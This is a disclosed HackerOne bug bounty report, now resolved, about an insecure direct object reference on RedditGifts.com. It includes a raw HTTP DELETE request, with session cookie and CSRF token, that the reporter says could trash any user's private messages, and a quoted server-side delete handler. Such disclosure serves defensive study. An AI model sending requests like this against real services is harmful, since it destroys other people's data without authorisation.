---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insecure-direct-object-reference-idor
  - env/web
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2021-10-21
submitted: 2021-05-31T02:09:36.165Z
bounty_usd: 5000
votes: 267
cve: []
program: "[[programs/reddit|Reddit]]"
reporter: "hakercic"
source: "https://hackerone.com/reports/1213237"
title: "Deleting all DMs on RedditGifts.com"
---
# Deleting all DMs on RedditGifts.com

> **Severity:** High | **Bounty:** 5,000 USD | **Votes:** 267 | **Program:** Reddit | **Disclosed:** 2021-10-21

- Report: [https://hackerone.com/reports/1213237](https://hackerone.com/reports/1213237)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2021-05-31T02:09:36.165Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
It's possible to delete all 4.4M private messages on RedditGifts.com due to missing permission check on DELETE request

## Steps To Reproduce:

  1. Set up 3 accounts on RedditGifts.com (FriendA, FriendB, Attacker)
  1. Have FriendA send message to FriendB
  1. As Attacker send the following request (with cookies):
```
DELETE /api/v1/messages/4423007/ HTTP/1.1
Host: www.redditgifts.com
X-CSRFTOKEN: rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj
Referer: https://www.redditgifts.com/api/
Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6sp6bb83gyt8of7qbeurtuo2450
```
Change cookies/csrf token and `4423007` to your own message ID

## Supporting Material/References:

{F1320816}
{F1320817}

## Impact

It's possible to delete all 4.4M private messages on RedditGifts.com

## Timeline

- **Report Filed**
- **2021-06-01** @0xcain: Hi @parasimpaticki,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@0xcain
- **Report Triaged**
- **2021-06-01** @gunther_reddit: Interesting, we're taking a look at this. That endpoint _should_ be doing authorization checks if the request user is in the To or From of the message. Query code for this below:

```
    def delete(self, request, message_id):
        try:
            message = Message.objects.get(
                Q(from_user=request.user) | Q(to_user=request.user), id=message_id
            )
        except Message.DoesNotExist:
            respData = build_response_object(error_message="No message matches query.")
            return Response(respData, status=status.HTTP_400_BAD_REQUEST)

        message.trash = True
        message.save()
        data = {"status": "ok"}

        respData = build_response_object(data=data)
        return Response(respData)
```

So line 3-4 should have caught this. Similarly the GET request should also have failed. So something is very odd here, thanks for the report.
- **Report Severity Updated**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2021-06-01** @hakercic: That was fast :D Thanks for the bounty <3
- **Agreed On Going Public**
- **Report Became Public**
